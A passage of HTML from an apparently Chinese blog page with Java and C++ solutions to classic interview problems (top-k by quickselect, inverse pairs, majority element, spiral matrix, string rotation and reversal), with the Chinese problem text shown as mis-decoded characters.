class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> judge(a,lo,hi);</span><br><span class="line">            <span class="keyword">if</span>(mid==k) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(mid&lt;k)lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">judge</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=lo,j=hi,x=a[lo];        </span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; input.<span class="built_in">size</span>()||k&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">qs</span>(input, k - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">qs</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> lo = <span class="number">0</span>, hi = input.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="type">int</span> mid = <span class="built_in">select</span>(input, lo, hi);</span><br><span class="line">            <span class="keyword">if</span> (k == mid) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (input[mid] &gt; k)hi = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> lo = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">begin</span>(input), <span class="built_in">begin</span>(input)+k+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">select</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; a, <span class="type">int</span> lo, <span class="type">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = lo, j = hi, x = a[lo];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; x &lt;= a[j])j--;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)a[i] = a[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; x &gt; a[i])i++;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)a[j] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i] = x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Solution s;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; A&#123; <span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i:s.<span class="built_in">GetLeastNumbers_Solution</span>(A,<span class="number">6</span>))</span><br><span class="line">    cout &lt;&lt; i &lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„ä¸­çš„é€†åºå¯¹-">æ•°ç»„ä¸­çš„é€†åºå¯¹ -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">long</span> cnt;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">InversePairs</span><span class="params">(<span class="type">int</span>[] array)</span> &#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="literal">null</span>||array.length==<span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">        mergeSort(array, <span class="number">0</span>, array.length - <span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">int</span>[array.length]);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)(cnt%<span class="number">1000000007</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å½’å¹¶æ’åº(ä»ä¸Šå¾€ä¸‹)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> start, <span class="type">int</span> end,<span class="type">int</span>[] tmp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (start + end) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        mergeSort(a, start, mid,tmp);</span><br><span class="line">        mergeSort(a, mid + <span class="number">1</span>, end,tmp);</span><br><span class="line">        merge(a, start, mid, end,tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å°†ä¸€ä¸ªæ•°ç»„ä¸­çš„ä¸¤ä¸ªç›¸é‚»æœ‰åºåŒºé—´åˆå¹¶æˆä¸€ä¸ª</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> start, <span class="type">int</span> mid, <span class="type">int</span> end,<span class="type">int</span>[] tmp)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">                tmp[k++] = a[i++];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[k++] = a[j++];</span><br><span class="line">                cnt += mid - i + <span class="number">1</span>;  <span class="comment">// core code, calculate InversePairs............</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">            tmp[k++] = a[i++];</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= end)</span><br><span class="line">            tmp[k++] = a[j++];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;k; i++)</span><br><span class="line">            a[start + i] = tmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—">æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­— Ã—</span></h2><p>æ•°ç»„ä¸­æœ‰ä¸€ä¸ªæ•°å­—å‡ºç°çš„æ¬¡æ•°è¶…è¿‡æ•°ç»„é•¿åº¦çš„ä¸€åŠï¼Œè¯·æ‰¾å‡ºè¿™ä¸ªæ•°å­—ã€‚ä¾‹å¦‚è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º9çš„æ•°ç»„{1,2,3,2,2,2,5,4,2}ã€‚ç”±äºæ•°å­—2åœ¨æ•°ç»„ä¸­å‡ºç°äº†5æ¬¡ï¼Œè¶…è¿‡æ•°ç»„é•¿åº¦çš„ä¸€åŠï¼Œå› æ­¤è¾“å‡º2ã€‚å¦‚æœä¸å­˜åœ¨åˆ™è¾“å‡º0ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">MoreThanHalfNum_Solution</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">majority</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>, cnt = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        cnt = nums[i] == majority ? cnt + <span class="number">1</span> : cnt - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">0</span>) &#123;</span><br><span class="line">            majority = nums[i];</span><br><span class="line">            cnt = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> val : nums)</span><br><span class="line">        <span class="keyword">if</span> (val == majority)</span><br><span class="line">            cnt++;</span><br><span class="line">    <span class="keyword">return</span> cnt &gt; nums.length / <span class="number">2</span> ? majority : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ">é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ Ã—</span></h2><p>è¾“å…¥ä¸€ä¸ªçŸ©é˜µï¼ŒæŒ‰ç…§ä»å¤–å‘é‡Œä»¥é¡ºæ—¶é’ˆçš„é¡ºåºä¾æ¬¡æ‰“å°å‡ºæ¯ä¸€ä¸ªæ•°å­—ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥å¦‚ä¸‹4 X 4çŸ©é˜µï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 åˆ™ä¾æ¬¡æ‰“å°å‡ºæ•°å­—1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">printMatrix</span><span class="params">(<span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">r1</span> <span class="operator">=</span> <span class="number">0</span>, r2 = matrix.length - <span class="number">1</span>, c1 = <span class="number">0</span>, c2 = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (r1 &lt;= r2 &amp;&amp; c1 &lt;= c2) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> c1; i &lt;= c2; i++)</span><br><span class="line">            ret.add(matrix[r1][i]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r1 + <span class="number">1</span>; i &lt;= r2; i++)</span><br><span class="line">            ret.add(matrix[i][c2]);</span><br><span class="line">        <span class="keyword">if</span> (r1 != r2)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> c2 - <span class="number">1</span>; i &gt;= c1; i--)</span><br><span class="line">                ret.add(matrix[r2][i]);</span><br><span class="line">        <span class="keyword">if</span> (c1 != c2)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r2 - <span class="number">1</span>; i &gt; r1; i--)</span><br><span class="line">                ret.add(matrix[i][c1]);</span><br><span class="line">        r1++; r2--; c1++; c2--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</span></h1><h2><span id="æ›¿æ¢ç©ºæ ¼">æ›¿æ¢ç©ºæ ¼ âˆš</span></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆâ€œ%20â€ã€‚ä¾‹å¦‚ï¼Œå½“å­—ç¬¦ä¸²ä¸ºWe Are Happy.åˆ™ç»è¿‡æ›¿æ¢ä¹‹åçš„å­—ç¬¦ä¸²ä¸ºWe%20Are%20Happyã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(StringBuffer str)</span> &#123;</span><br><span class="line">        <span class="type">int</span> p1=str.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=p1;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(i)==<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                str.append(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> p2=str.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(p1&gt;=<span class="number">0</span>&amp;&amp;p1&lt;p2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(p1)!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                str.setCharAt(p2--,str.charAt(p1--));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p1--;</span><br><span class="line">                str.setCharAt(p2--,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                str.setCharAt(p2--,<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">                str.setCharAt(p2--,<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="å·¦æ—‹è½¬å­—ç¬¦ä¸²">å·¦æ—‹è½¬å­—ç¬¦ä¸² âˆš</span></h2><p>æ±‡ç¼–è¯­è¨€ä¸­æœ‰ä¸€ç§ç§»ä½æŒ‡ä»¤å«åšå¾ªç¯å·¦ç§»ï¼ˆROLï¼‰ï¼Œç°åœ¨æœ‰ä¸ªç®€å•çš„ä»»åŠ¡ï¼Œå°±æ˜¯ç”¨å­—ç¬¦ä¸²æ¨¡æ‹Ÿè¿™ä¸ªæŒ‡ä»¤çš„è¿ç®—ç»“æœã€‚å¯¹äºä¸€ä¸ªç»™å®šçš„å­—ç¬¦åºåˆ—Sï¼Œè¯·ä½ æŠŠå…¶å¾ªç¯å·¦ç§»Kä½åçš„åºåˆ—è¾“å‡ºã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦åºåˆ—S&#x3D;â€abcXYZdefâ€,è¦æ±‚è¾“å‡ºå¾ªç¯å·¦ç§»3ä½åçš„ç»“æœï¼Œå³â€œXYZdefabcâ€ã€‚æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼ŸOKï¼Œæå®šå®ƒï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">LeftRotateString</span><span class="params">(String str,<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="literal">null</span>||str.length()==<span class="number">0</span>) <span class="keyword">return</span> str;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">        n=n%len;      </span><br><span class="line">        <span class="type">char</span>[] c=str.toCharArray();</span><br><span class="line">        rotate(c,<span class="number">0</span>,n-<span class="number">1</span>);</span><br><span class="line">        rotate(c,n,len-<span class="number">1</span>);</span><br><span class="line">        rotate(c,<span class="number">0</span>,len-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> String.valueOf(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">char</span>[] c,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(hi&gt;lo)&#123;</span><br><span class="line">             <span class="type">char</span> tmp=c[lo];</span><br><span class="line">            c[lo]=c[hi];</span><br><span class="line">            c[hi]=tmp;</span><br><span class="line">            hi--;</span><br><span class="line">            lo++;</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="ç¿»è½¬å•è¯é¡ºåºåˆ—">ç¿»è½¬å•è¯é¡ºåºåˆ— âˆš</span></h2><p>ç‰›å®¢æœ€è¿‘æ¥äº†ä¸€ä¸ªæ–°å‘˜å·¥Fishï¼Œæ¯å¤©æ—©æ™¨æ€»æ˜¯ä¼šæ‹¿ç€ä¸€æœ¬è‹±æ–‡æ‚å¿—ï¼Œå†™äº›å¥å­åœ¨æœ¬å­ä¸Šã€‚åŒäº‹Catå¯¹Fishå†™çš„å†…å®¹é¢‡æ„Ÿå…´è¶£ï¼Œæœ‰ä¸€å¤©ä»–å‘Fishå€Ÿæ¥ç¿»çœ‹ï¼Œä½†å´è¯»ä¸æ‡‚å®ƒçš„æ„æ€ã€‚ä¾‹å¦‚ï¼Œâ€œstudent. a am Iâ€ã€‚åæ¥æ‰æ„è¯†åˆ°ï¼Œè¿™å®¶ä¼™åŸæ¥æŠŠå¥å­å•è¯çš„é¡ºåºç¿»è½¬äº†ï¼Œæ­£ç¡®çš„å¥å­åº”è¯¥æ˜¯â€œI am a student.â€ã€‚Catå¯¹ä¸€ä¸€çš„ç¿»è½¬è¿™äº›å•è¯é¡ºåºå¯ä¸åœ¨è¡Œï¼Œä½ èƒ½å¸®åŠ©ä»–ä¹ˆï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">ReverseSentence</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(str.trim().equals(<span class="string">&quot;&quot;</span>)||str.length()&lt;=<span class="number">1</span>)<span class="keyword">return</span> str;</span><br><span class="line">        String[] s=str.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=s.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            res+=s[i]+<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.substring(<span class="number">0</span>,res.length()-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">ReverseSentence</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> str.length();</span><br><span class="line">    <span class="type">char</span>[] chars = str.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == n || chars[j] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            reverse(chars, i, j - <span class="number">1</span>);</span><br><span class="line">            i = j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(chars, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] c, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        swap(c, i++, j--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">char</span>[] c, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">t</span> <span class="operator">=</span> c[i];</span><br><span class="line">    c[i] = c[j];</span><br><span class="line">    c[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦">ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ âˆš</span></h2><p>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²(0&lt;&#x3D;å­—ç¬¦ä¸²é•¿åº¦&lt;&#x3D;10000ï¼Œå…¨éƒ¨ç”±å­—æ¯ç»„æˆ)ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦,å¹¶è¿”å›å®ƒçš„ä½ç½®, å¦‚æœæ²¡æœ‰åˆ™è¿”å› -1ï¼ˆéœ€è¦åŒºåˆ†å¤§å°å†™ï¼‰.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">FirstNotRepeatingChar</span><span class="params">(String str)</span> &#123;</span><br><span class="line">       <span class="type">int</span>[] map=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">52</span>];</span><br><span class="line">       Arrays.fill(map,-<span class="number">2</span>);</span><br><span class="line">       <span class="type">char</span> c[]=str.toCharArray();</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">           <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">           <span class="keyword">if</span>(c[i]&gt;<span class="string">&#x27;Z&#x27;</span>)&#123;</span><br><span class="line">               index=c[i]-<span class="string">&#x27;a&#x27;</span>+<span class="number">26</span>;                </span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              index =c[i]-<span class="string">&#x27;A&#x27;</span>;                </span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(map[index]==-<span class="number">2</span>) map[index]=i;</span><br><span class="line">           <span class="keyword">else</span> map[index]=-<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span> res=Integer.MAX_VALUE;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span 